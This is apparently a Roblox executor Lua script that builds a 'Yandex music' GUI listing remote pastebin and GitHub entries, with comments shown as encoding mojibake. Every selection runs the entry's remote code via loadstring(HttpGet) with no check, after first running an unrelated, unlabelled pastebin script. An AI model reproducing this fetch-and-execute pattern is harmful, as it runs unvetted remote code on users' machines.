
local ScriptManager = {
    Scripts = {},
    Favorites = {},
    Loaded = false,
    GUI = nil
}

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –∏–∑–±—Ä–∞–Ω–Ω—ã—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤
function ScriptManager:LoadFavorites()
    if not isfolder or not makefolder or not writefile or not readfile then
        warn("–§–∞–π–ª–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã")
        self.Favorites = {}
        return
    end
    
    if not isfolder("ScriptManager") then
        makefolder("ScriptManager")
    end
    
    local path = "ScriptManager/favorites.json"
    
    if not isfile(path) then
        self.Favorites = {}
        return
    end
    
    local success, result = pcall(function()
        return game:GetService("HttpService"):JSONDecode(readfile(path))
    end)
    
    if success and type(result) == "table" then
        self.Favorites = result
    else
        self.Favorites = {}
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∏–∑–±—Ä–∞–Ω–Ω—ã—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤
function ScriptManager:SaveFavorites()
    if not writefile then return end
    
    local path = "ScriptManager/favorites.json"
    local success, err = pcall(function()
        writefile(path, game:GetService("HttpService"):JSONEncode(self.Favorites))
    end)
    
    if not success then
        warn("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è: " .. tostring(err))
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Å–∫—Ä–∏–ø—Ç–∞
function ScriptManager:AddScript(name, url)
    table.insert(self.Scripts, {
        Name = name,
        URL = url
    })
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ –∏–∑–±—Ä–∞–Ω–Ω–æ–µ
function ScriptManager:AddFavorite(name)
    if not table.find(self.Favorites, name) then
        table.insert(self.Favorites, name)
        self:SaveFavorites()
        return true
    end
    return false
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –∏–∑ –∏–∑–±—Ä–∞–Ω–Ω–æ–≥–æ
function ScriptManager:RemoveFavorite(name)
    local index = table.find(self.Favorites, name)
    if index then
        table.remove(self.Favorites, index)
        self:SaveFavorites()
        return true
    end
    return false
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞
function ScriptManager:ExecuteScript(url)
    -- –ü–æ–¥–≥–æ—Ç–æ–≤–∏—Ç–µ–ª—å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç
    local success, err = pcall(function()
        loadstring(game:HttpGet('https://pastebin.com/raw/Si1it7Zd'))()
    end)
    
    if not success then
        warn("–û—à–∏–±–∫–∞ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∏: " .. tostring(err))
    end
    
    task.wait(0.4)
    
    -- –û—Å–Ω–æ–≤–Ω–æ–π —Å–∫—Ä–∏–ø—Ç
    local success, err = pcall(function()
        loadstring(game:HttpGet(url))()
    end)
    
    if not success then
        warn("–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: " .. tostring(err))
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Å–ª—É—á–∞–π–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
function ScriptManager:ExecuteRandomScript()
    if #self.Scripts > 0 then
        local randomScript = self.Scripts[math.random(1, #self.Scripts)]
        self:ExecuteScript(randomScript.URL)
    else
        warn("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã–Ω–æ–π –º—É–∑—ã–∫–∏")
    end
end

-- –°–æ–∑–¥–∞–Ω–∏–µ –∫—Ä–∞—Å–∏–≤–æ–≥–æ GUI —Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è
function ScriptManager:CreateGUI()
    local UserInputService = game:GetService("UserInputService")
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ScriptManagerGUI"
    screenGui.Parent = game:GetService("CoreGui")
    
    -- –ì–ª–∞–≤–Ω—ã–π —Ñ—Ä–µ–π–º —Å –∫—Ä–∞—Å–∏–≤—ã–º –¥–∏–∑–∞–π–Ω–æ–º
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 500, 0, 550)
    mainFrame.Position = UDim2.new(0.5, -250, 0.5, 150)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    mainFrame.BorderSizePixel = 0
    
    -- –°–∫—Ä—É–≥–ª–µ–Ω–Ω—ã–µ —É–≥–ª—ã
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame
    
    -- –¢–µ–Ω—å
    local shadow = Instance.new("UIStroke")
    shadow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    shadow.Color = Color3.fromRGB(60, 60, 80)
    shadow.Thickness = 2
    shadow.Transparency = 0.5
    shadow.Parent = mainFrame
    
    mainFrame.Parent = screenGui
    
    -- –ó–∞–≥–æ–ª–æ–≤–æ–∫ —Å –≥—Ä–∞–¥–∏–µ–Ω—Ç–æ–º (–¥–ª—è –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è)
    local title = Instance.new("Frame")
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    title.Name = "TitleBar"
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 12)
    titleCorner.Parent = title
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Text = "–Ø–Ω–¥–µ–∫—Å –º—É–∑—ã–∫–∞"
    titleLabel.Size = UDim2.new(1, -50, 1, 0)
    titleLabel.Position = UDim2.new(0, 15, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 20
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = title
    
    title.Parent = mainFrame
    
    -- –ö–Ω–æ–ø–∫–∞ –∑–∞–∫—Ä—ã—Ç–∏—è
    local closeButton = Instance.new("TextButton")
    closeButton.Text = "√ó"
    closeButton.Size = UDim2.new(0, 40, 0, 40)
    closeButton.Position = UDim2.new(1, -45, 0, 5)
    closeButton.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    closeButton.TextColor3 = Color3.fromRGB(255, 100, 100)
    closeButton.Font = Enum.Font.GothamBold
    closeButton.TextSize = 24
    closeButton.ZIndex = 2
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 8)
    closeCorner.Parent = closeButton
    
    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        self.GUI = nil
    end)
    
    closeButton.Parent = mainFrame
    
    -- –¢–∞–±—ã
    local tabButtonsFrame = Instance.new("Frame")
    tabButtonsFrame.Size = UDim2.new(1, -40, 0, 40)
    tabButtonsFrame.Position = UDim2.new(0, 20, 0, 60)
    tabButtonsFrame.BackgroundTransparency = 1
    tabButtonsFrame.Parent = mainFrame
    
    local mainTabButton = Instance.new("TextButton")
    mainTabButton.Text = "–í–°–Ø –ú–£–ó–´–ö–ê"
    mainTabButton.Size = UDim2.new(0.5, -5, 1, 0)
    mainTabButton.Position = UDim2.new(0, 0, 0, 0)
    mainTabButton.BackgroundColor3 = Color3.fromRGB(70, 100, 150)
    mainTabButton.TextColor3 = Color3.fromRGB(240, 240, 255)
    mainTabButton.Font = Enum.Font.GothamBold
    mainTabButton.TextSize = 14
    
    local tabCorner1 = Instance.new("UICorner")
    tabCorner1.CornerRadius = UDim.new(0, 8)
    tabCorner1.Parent = mainTabButton
    
    mainTabButton.Parent = tabButtonsFrame
    
    local favoritesTabButton = Instance.new("TextButton")
    favoritesTabButton.Text = "–ò–ó–ë–†–ê–ù–ù–û–ï"
    favoritesTabButton.Size = UDim2.new(0.5, -5, 1, 0)
    favoritesTabButton.Position = UDim2.new(0.5, 5, 0, 0)
    favoritesTabButton.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    favoritesTabButton.TextColor3 = Color3.fromRGB(200, 200, 220)
    favoritesTabButton.Font = Enum.Font.GothamBold
    favoritesTabButton.TextSize = 14
    
    local tabCorner2 = Instance.new("UICorner")
    tabCorner2.CornerRadius = UDim.new(0, 8)
    tabCorner2.Parent = favoritesTabButton
    
    favoritesTabButton.Parent = tabButtonsFrame
    
    -- –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã –¥–ª—è —Ç–∞–±–æ–≤
    local tabsContainer = Instance.new("Frame")
    tabsContainer.Size = UDim2.new(1, -40, 0.7, -10)
    tabsContainer.Position = UDim2.new(0, 20, 0, 110)
    tabsContainer.BackgroundTransparency = 1
    tabsContainer.Parent = mainFrame
    
    local mainTab = Instance.new("ScrollingFrame")
    mainTab.Size = UDim2.new(1, 0, 1, 0)
    mainTab.Position = UDim2.new(0, 0, 0, 0)
    mainTab.BackgroundTransparency = 1
    mainTab.ScrollBarThickness = 6
    mainTab.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 150)
    mainTab.CanvasSize = UDim2.new(0, 0, 0, 0)
    mainTab.Visible = true
    mainTab.Parent = tabsContainer
    
    local favoritesTab = Instance.new("ScrollingFrame")
    favoritesTab.Size = UDim2.new(1, 0, 1, 0)
    favoritesTab.Position = UDim2.new(0, 0, 0, 0)
    favoritesTab.BackgroundTransparency = 1
    favoritesTab.ScrollBarThickness = 6
    favoritesTab.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 150)
    favoritesTab.CanvasSize = UDim2.new(0, 0, 0, 0)
    favoritesTab.Visible = false
    favoritesTab.Parent = tabsContainer
    
    -- –ü–æ–∏—Å–∫ (–Ω–∏–∂–µ –∫–Ω–æ–ø–æ–∫)
    local searchBoxFrame = Instance.new("Frame")
    searchBoxFrame.Size = UDim2.new(1, -40, 0, 40)
    searchBoxFrame.Position = UDim2.new(0, 20, 0, 390)
    searchBoxFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    
    local searchCorner = Instance.new("UICorner")
    searchCorner.CornerRadius = UDim.new(0, 8)
    searchCorner.Parent = searchBoxFrame
    
    local searchBox = Instance.new("TextBox")
    searchBox.PlaceholderText = "–ü–æ–∏—Å–∫ —Å–∫—Ä–∏–ø—Ç–æ–≤..."
    searchBox.Size = UDim2.new(1, -20, 1, -10)
    searchBox.Position = UDim2.new(0, 10, 0, 5)
    searchBox.BackgroundTransparency = 1
    searchBox.TextColor3 = Color3.fromRGB(220, 220, 255)
    searchBox.Font = Enum.Font.Gotham
    searchBox.TextSize = 14
    searchBox.TextXAlignment = Enum.TextXAlignment.Left
    searchBox.Parent = searchBoxFrame
    
    local searchIcon = Instance.new("ImageLabel")
    searchIcon.Size = UDim2.new(0, 20, 0, 20)
    searchIcon.Position = UDim2.new(1, -30, 0.5, -10)
    searchIcon.BackgroundTransparency = 1
    searchIcon.Image = "rbxassetid://3926305904"
    searchIcon.ImageRectOffset = Vector2.new(964, 324)
    searchIcon.ImageRectSize = Vector2.new(36, 36)
    searchIcon.ImageColor3 = Color3.fromRGB(180, 180, 220)
    searchIcon.Parent = searchBoxFrame
    
    searchBoxFrame.Parent = mainFrame
    
    -- –ö–Ω–æ–ø–∫–∏ –¥–µ–π—Å—Ç–≤–∏–π (—Å–Ω–∏–∑—É)
    local actionsFrame = Instance.new("Frame")
    actionsFrame.Size = UDim2.new(1, -40, 0, 50)
    actionsFrame.Position = UDim2.new(0, 20, 1, -65)
    actionsFrame.BackgroundTransparency = 1
    actionsFrame.Parent = mainFrame
    
    local randomScriptButton = Instance.new("TextButton")
    randomScriptButton.Text = "–°–õ–£–ß–ê–ô–ù–ê–Ø –ú–£–ó–´–ö–ê"
    randomScriptButton.Size = UDim2.new(0.5, -5, 1, 0)
    randomScriptButton.Position = UDim2.new(0, 0, 0, 0)
    randomScriptButton.BackgroundColor3 = Color3.fromRGB(80, 120, 180)
    randomScriptButton.TextColor3 = Color3.fromRGB(240, 240, 255)
    randomScriptButton.Font = Enum.Font.GothamBold
    randomScriptButton.TextSize = 14
    
    local randomCorner = Instance.new("UICorner")
    randomCorner.CornerRadius = UDim.new(0, 8)
    randomCorner.Parent = randomScriptButton
    
    randomScriptButton.Parent = actionsFrame
    
    local saveButton = Instance.new("TextButton")
    saveButton.Text = "–°–û–•–†–ê–ù–ò–¢–¨"
    saveButton.Size = UDim2.new(0.5, -5, 1, 0)
    saveButton.Position = UDim2.new(0.5, 5, 0, 0)
    saveButton.BackgroundColor3 = Color3.fromRGB(70, 160, 90)
    saveButton.TextColor3 = Color3.fromRGB(240, 240, 255)
    saveButton.Font = Enum.Font.GothamBold
    saveButton.TextSize = 14
    
    local saveCorner = Instance.new("UICorner")
    saveCorner.CornerRadius = UDim.new(0, 8)
    saveCorner.Parent = saveButton
    
    saveButton.Parent = actionsFrame
    
    -- –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ç–∞–±–∞–º–∏
    mainTabButton.MouseButton1Click:Connect(function()
        mainTab.Visible = true
        favoritesTab.Visible = false
        mainTabButton.BackgroundColor3 = Color3.fromRGB(70, 100, 150)
        favoritesTabButton.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    end)
    
    favoritesTabButton.MouseButton1Click:Connect(function()
        mainTab.Visible = false
        favoritesTab.Visible = true
        mainTabButton.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
        favoritesTabButton.BackgroundColor3 = Color3.fromRGB(70, 100, 150)
        self:UpdateFavoritesUI()
    end)
    
    -- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è GUI
    local dragging
    local dragInput
    local dragStart
    local startPos
    
    local function update(input)
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    
    title.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    title.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
    
    -- –í–æ–∑–≤—Ä–∞—â–∞–µ–º —ç–ª–µ–º–µ–Ω—Ç—ã —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
    return {
        ScreenGui = screenGui,
        MainTab = mainTab,
        FavoritesTab = favoritesTab,
        SearchBox = searchBox,
        RandomScriptButton = randomScriptButton,
        SaveButton = saveButton,
        MainFrame = mainFrame
    }
end

-- –°–æ–∑–¥–∞–Ω–∏–µ –∫—Ä–∞—Å–∏–≤–æ–π –∫–Ω–æ–ø–∫–∏ —Å–∫—Ä–∏–ø—Ç–∞ —Å —É–ª—É—á—à–µ–Ω–Ω—ã–º —Ç–µ–∫—Å—Ç–æ–º
function ScriptManager:CreateScriptButton(parent, scriptData, isFavorite)
    local buttonFrame = Instance.new("Frame")
    buttonFrame.Name = "ScriptButton_" .. scriptData.Name
    buttonFrame.Size = UDim2.new(1, 0, 0, 50)
    buttonFrame.Position = UDim2.new(0, 0, 0, #parent:GetChildren() * 55)
    buttonFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    buttonFrame.BackgroundTransparency = 0.5
    
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 8)
    buttonCorner.Parent = buttonFrame
    
    local buttonStroke = Instance.new("UIStroke")
    buttonStroke.Color = Color3.fromRGB(70, 70, 100)
    buttonStroke.Thickness = 1
    buttonStroke.Parent = buttonFrame
    
    buttonFrame.Parent = parent
    
    -- –ò–∫–æ–Ω–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞
    local scriptIcon = Instance.new("ImageLabel")
    scriptIcon.Size = UDim2.new(0, 30, 0, 30)
    scriptIcon.Position = UDim2.new(0, 10, 0.5, -15)
    scriptIcon.BackgroundTransparency = 1
    scriptIcon.Image = "rbxassetid://3926305904"
    scriptIcon.ImageRectOffset = Vector2.new(964, 204)
    scriptIcon.ImageRectSize = Vector2.new(36, 36)
    scriptIcon.ImageColor3 = Color3.fromRGB(100, 150, 255)
    scriptIcon.Parent = buttonFrame
    
    -- –¢–µ–∫—Å—Ç —Å–∫—Ä–∏–ø—Ç–∞ (—Å–¥–≤–∏–Ω—É—Ç –≤–ø—Ä–∞–≤–æ)
    local button = Instance.new("TextButton")
    button.Text = scriptData.Name
    button.Size = UDim2.new(1, -90, 1, -10) -- –£–º–µ–Ω—å—à–µ–Ω–∞ —à–∏—Ä–∏–Ω–∞, —á—Ç–æ–±—ã –Ω–µ –∑–∞–ª–µ–∑–∞–ª –Ω–∞ –∫–Ω–æ–ø–∫—É –ª–∞–π–∫–∞
    button.Position = UDim2.new(0, 50, 0, 5) -- –°–¥–≤–∏–Ω—É—Ç –≤–ø—Ä–∞–≤–æ –Ω–∞ 50 –ø–∏–∫—Å–µ–ª–µ–π
    button.BackgroundTransparency = 1
    button.TextColor3 = Color3.fromRGB(220, 220, 255)
    button.Font = Enum.Font.Gotham
    button.TextSize = 14
    button.TextXAlignment = Enum.TextXAlignment.Left
    button.Parent = buttonFrame
    
    -- –ö–Ω–æ–ø–∫–∞ –ª–∞–π–∫–∞
    local likeButton = Instance.new("TextButton")
    likeButton.Text = isFavorite and "‚ù§Ô∏è" or "ü§ç"
    likeButton.Size = UDim2.new(0, 40, 1, 0)
    likeButton.Position = UDim2.new(1, -40, 0, 0)
    likeButton.BackgroundTransparency = 1
    likeButton.TextColor3 = isFavorite and Color3.fromRGB(255, 100, 150) or Color3.fromRGB(180, 180, 220)
    likeButton.Font = Enum.Font.GothamBold
    likeButton.TextSize = 18
    likeButton.Parent = buttonFrame
    
    button.MouseButton1Click:Connect(function()
        self:ExecuteScript(scriptData.URL)
    end)
    
    likeButton.MouseButton1Click:Connect(function()
        if isFavorite then
            self:RemoveFavorite(scriptData.Name)
            likeButton.Text = "ü§ç"
            likeButton.TextColor3 = Color3.fromRGB(180, 180, 220)
        else
            self:AddFavorite(scriptData.Name)
            likeButton.Text = "‚ù§Ô∏è"
            likeButton.TextColor3 = Color3.fromRGB(255, 100, 150)
        end
        self:UpdateFavoritesUI()
    end)
    
    -- –ê–Ω–∏–º–∞—Ü–∏—è –ø—Ä–∏ –Ω–∞–≤–µ–¥–µ–Ω–∏–∏
    button.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(
            buttonFrame,
            TweenInfo.new(0.2),
            {BackgroundTransparency = 0.3}
        ):Play()
    end)
    
    button.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(
            buttonFrame,
            TweenInfo.new(0.2),
            {BackgroundTransparency = 0.5}
        ):Play()
    end)
    
    likeButton.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(
            likeButton,
            TweenInfo.new(0.2),
            {TextColor3 = Color3.fromRGB(255, 150, 180)}
        ):Play()
    end)
    
    likeButton.MouseLeave:Connect(function()
        if isFavorite then
            game:GetService("TweenService"):Create(
                likeButton,
                TweenInfo.new(0.2),
                {TextColor3 = Color3.fromRGB(255, 100, 150)}
            ):Play()
        else
            game:GetService("TweenService"):Create(
                likeButton,
                TweenInfo.new(0.2),
                {TextColor3 = Color3.fromRGB(180, 180, 220)}
            ):Play()
        end
    end)
    
    -- –û–±–Ω–æ–≤–ª—è–µ–º CanvasSize
    parent.CanvasSize = UDim2.new(0, 0, 0, #parent:GetChildren() * 55)
end

-- –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ UI —Å–∫—Ä–∏–ø—Ç–æ–≤
function ScriptManager:UpdateScriptsUI(filter)
    if not self.GUI or not self.GUI.MainTab then return end
    
    -- –û—á–∏—â–∞–µ–º —Ç–µ–∫—É—â–∏–µ –∫–Ω–æ–ø–∫–∏
    for _, child in ipairs(self.GUI.MainTab:GetChildren()) do
        if child:IsA("Frame") and string.find(child.Name, "ScriptButton_") then
            child:Destroy()
        end
    end
    
    -- –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–µ –∫–Ω–æ–ø–∫–∏
    for _, script in ipairs(self.Scripts) do
        if not filter or string.find(string.lower(script.Name), string.lower(filter or "")) then
            local isFavorite = table.find(self.Favorites, script.Name) ~= nil
            self:CreateScriptButton(self.GUI.MainTab, script, isFavorite)
        end
    end
end

-- –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ UI –∏–∑–±—Ä–∞–Ω–Ω–æ–≥–æ
function ScriptManager:UpdateFavoritesUI()
    if not self.GUI or not self.GUI.FavoritesTab then return end
    
    -- –û—á–∏—â–∞–µ–º —Ç–µ–∫—É—â–∏–µ –∫–Ω–æ–ø–∫–∏
    for _, child in ipairs(self.GUI.FavoritesTab:GetChildren()) do
        if child:IsA("Frame") and string.find(child.Name, "ScriptButton_") then
            child:Destroy()
        end
    end
    
    -- –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–µ –∫–Ω–æ–ø–∫–∏
    for _, name in ipairs(self.Favorites) do
        for _, script in ipairs(self.Scripts) do
            if script.Name == name then
                self:CreateScriptButton(self.GUI.FavoritesTab, script, true)
                break
            end
        end
    end
end

-- –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è GUI
function ScriptManager:InitGUI()
    if self.GUI then
        self.GUI.ScreenGui:Destroy()
    end
    
    self.GUI = self:CreateGUI()
    
    -- –ü–æ–∏—Å–∫
    self.GUI.SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
        self:UpdateScriptsUI(self.GUI.SearchBox.Text)
    end)
    
    -- –ö–Ω–æ–ø–∫–∞ —Å–ª—É—á–∞–π–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
    self.GUI.RandomScriptButton.MouseButton1Click:Connect(function()
        self:ExecuteRandomScript()
    end)
    
    -- –ö–Ω–æ–ø–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è
    self.GUI.SaveButton.MouseButton1Click:Connect(function()
        self:SaveFavorites()
        
        -- –ê–Ω–∏–º–∞—Ü–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è
        local originalText = self.GUI.SaveButton.Text
        self.GUI.SaveButton.Text = "–°–û–•–†–ê–ù–ï–ù–û!"
        game:GetService("TweenService"):Create(
            self.GUI.SaveButton,
            TweenInfo.new(0.3),
            {BackgroundColor3 = Color3.fromRGB(90, 190, 110)}
        ):Play()
        
        wait(1)
        
        game:GetService("TweenService"):Create(
            self.GUI.SaveButton,
            TweenInfo.new(0.3),
            {BackgroundColor3 = Color3.fromRGB(70, 160, 90)}
        ):Play()
        self.GUI.SaveButton.Text = originalText
    end)
    
    -- –ü–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ UI
    self:UpdateScriptsUI()
    self:UpdateFavoritesUI()
end

-- –î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–æ–≤ (–ø—Ä–∏–º–µ—Ä—ã)
ScriptManager:AddScript("porno game", "https://pastebin.com/raw/aXuM2Fps")
ScriptManager:AddScript("DJ MENOR DA DZ7 - Simplesmente o Melhor", "https://pastebin.com/raw/y20MFubc")
ScriptManager:AddScript("itgmq Hardstyle - All The Things She Said", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/itgmq%20Hardstyle%20-%20All%20The%20Things%20She%20Said")
ScriptManager:AddScript("—à–∏–∑–æ–Ω—è—à–∫–∞ - —Ä–≤—ë—Ç—Å—è –±–æ—à–∫–∞", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/WIZO_HAWKA")
ScriptManager:AddScript("–ü–û–õ–ú–ê–¢–ï–†–ò - –¥–æ–∫—Å", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/DOKS_POLMERIZ")
ScriptManager:AddScript("Lida - –ê–Ω–∏–º–µ –º—É–∑–æ–Ω—á–∏–∫", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/LIDA-ANIMEMUZON")
ScriptManager:AddScript("5mewmet - —ç—Ç–æ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è –ª—é–±–æ–≤—å -3", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/5MEWMETLOVENAME")
ScriptManager:AddScript("ZXCUR$EDD - –î–µ–º–æ–Ω –≤ –≥–æ–ª–æ–≤–µ 2", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/ZXCUR%24EDDDemonvgolove2")
ScriptManager:AddScript("ËØ¥Ëæû‚Ä§ - ËÄÅÂ§©‰øù‰ΩëÈáëÂ±±Èì∂Â±±", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/kitaibabai")
ScriptManager:AddScript("–°–µ—Ä–µ–≥–∞ –ü–∏—Ä–∞—Ç - –ü–æ—á–µ–º—É —Ç—ã –µ—â–µ –Ω–µ —Ñ–∞–Ω–∞—ÇÔºü", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/CEREGAPIRATPOWEMITIEIENEFANAT")
ScriptManager:AddScript("–§–†–≠–ù–ö - –°–∞–Ω—è –∏ –õ—ë—Ö–∞", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/FRANKECAWALEXA")
ScriptManager:AddScript("VHM4D - MONTAGEM NECK HURT MANGO FUNK", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/MANGONEG")
ScriptManager:AddScript("PHARAOH - Caramel", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/PHARAONCaramel")
ScriptManager:AddScript("Toxi$ - –í–ó–õ–û–ú prod. by SLAVA MARLOW", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/TOXIKBZLOM")
ScriptManager:AddScript("nxvctresx - X1v1v1d3", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/X1v1v1d3")
ScriptManager:AddScript("enveel - –ü—Ä–∏–∑—Ä–∞–∫ Speed Up", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/eveelprizrak")
ScriptManager:AddScript("–ê—Å—Ñ–∞–ª—å—Ç", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/discortkorolwit/ASVALT")
ScriptManager:AddScript("–ö–æ—Ä–æ–ª—å –∏ –®—É—Ç - –î—É—Ä–∞–∫ –∏ –º–æ–ª–Ω–∏—è", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/discortkorolwit/KOROLWITGurakUMolnii")
ScriptManager:AddScript("–ö–æ—Ä–æ–ª—å –∏ –®—É—Ç - –ú—ë—Ä—Ç–≤—ã–π –∞–Ω–∞—Ä—Ö–∏—Å—Ç", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/discortkorolwit/KOROLWITMertvianarxict")
ScriptManager:AddScript("–ö–æ—Ä–æ–ª—å –∏ –®—É—Ç - –ö—É–∫–ª–∞ –∫–æ–ª–¥—É–Ω–∞", "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Music/discortkorolwit/korolwitKYKLA")





-- –ó–∞–≥—Ä—É–∑–∫–∞ –∏–∑–±—Ä–∞–Ω–Ω–æ–≥–æ
ScriptManager:LoadFavorites()

-- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ—Ç–∫—Ä—ã—Ç–∏–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
ScriptManager:InitGUI()

ScriptManager.Loaded = true
print("–Ø–Ω–¥–µ–∫—Å –º—É–∑—ã–∫–∞!")
